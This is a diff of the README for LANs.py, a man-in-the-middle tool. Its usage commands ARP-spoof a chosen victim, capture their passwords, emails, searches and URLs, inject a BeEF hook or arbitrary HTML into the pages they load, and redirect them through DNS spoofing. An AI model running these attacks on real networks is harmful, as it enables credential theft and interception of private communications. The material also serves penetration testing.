@@ -22,29 +22,27 @@ python LANs.py [-a] [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMM
 Usage
 -----
 
-### Simplest usage (including active user targeting):
+### Common usage:
 
 ``` shell
-python LANs.py
+python LANs.py -u -p
 ```
+Active target identification which ARP spoofs the chosen target and outputs all the interesting non-HTTPS data they send or request. There's no -ip option so this will ARP scan the network, compare it to a live running promiscuous capture, and list all the clients on the network. Attempts to tag the targets with a Windows netbios name and prints how many data packets they are sending/receiving. The ability to capture data packets they send is very dependent on physical proximity and the power of your network card. Ctrl-C when you're ready and pick your target which it will then ARP spoof.
 
-Because there's no -ip option this will ARP scan the network, compare it to a live running promiscuous capture, and list all the clients on the network including their Windows netbios names along with how many data packets they're sending so you can immediately target the active ones. The ability to capture data packets they send is very dependent on physical proximity and the power of your network card. then you can Ctrl-C and pick your target which it will then ARP spoof. Simple target identification and ARP spoofing.
 
-### Passive harvesting:
+Supports interception and harvesting of data from the following protocols: HTTP, FTP, IMAP, POP3, IRC. Will print the first 135 characters of URLs visited and ignore URLs ending in .jpg, .jpeg, .gif, .css, .ico, .js, .svg, and .woff. Will also print all protocol username/passwords entered, searches made on any site, emails sent/received, and IRC messages sent/received. Screenshot: http://i.imgur.com/kQofTYP.png 
+
+Running LANs.py without argument will give you the list of active targets and upon selecting one, it will act as a simple ARP spoofer.
+
+### Another common usage:
 
 ``` shell
-python LANs.py -u -d -p -ip 192.168.0.10
+python LANs.py -u -p -d -ip 192.168.0.10
 ```
-
--u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting
 
 -d: open an xterm with driftnet to see all images they view
 
--p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received; will also decode base64 if the email authentication is encrypted with it
-
--ip: target this IP address
-
-Easy to remember and will probably be the most common usage of the script: options u, d, p, like udp/tcp.
+-ip: target this IP address and skip the active targeting at the beginning
 
 
 ### HTML injection:
@@ -53,14 +51,14 @@ Easy to remember and will probably be the most common usage of the script: optio
 python LANs.py -b http://192.168.0.5:3000/hook.js
 ```
 
-Inject a BeEF hook URL (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/) into pages the victim visits.
+Inject a BeEF hook URL (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/) into pages the victim visits. This just wraps the argument in <script> tags so you can really enter any location of a javascript file. Attempts to insert it after the first </head> tag found in the page's HTML.
 
 
 ``` shell
 python LANs.py -c '<title>Owned.</title>'
 ```
 
-Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first `<head>` and failing that injects prior to the first `</head>`. This example will change the page title to 'Owned.'
+Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first <head> tag and failing that, injects prior to the first </head> tag. This example will change the page title to 'Owned.'
 
 
 ### Read from pcap:
@@ -80,6 +78,7 @@ python LANs.py -a -r 80.87.128.67
 python LANs.py -dns eff.org
 ```
 Example 1: The -a option will spoof every single DNS request the victim makes and when used in conjuction with -r it will redirect them to -r's argument address. The victim will be redirected to stallman.org (80.87.128.67) no matter what they type in the address bar.  
+
 Example 2: This will spoof the domain eff.org and subdomains of eff.org. When there is no -r argument present with the -a or -dns arguments the script will default to sending the victim to the attacker's IP address. If the victim tries to go to eff.org they will be redirected to the attacker's IP.
 
 ### Most aggressive usage:
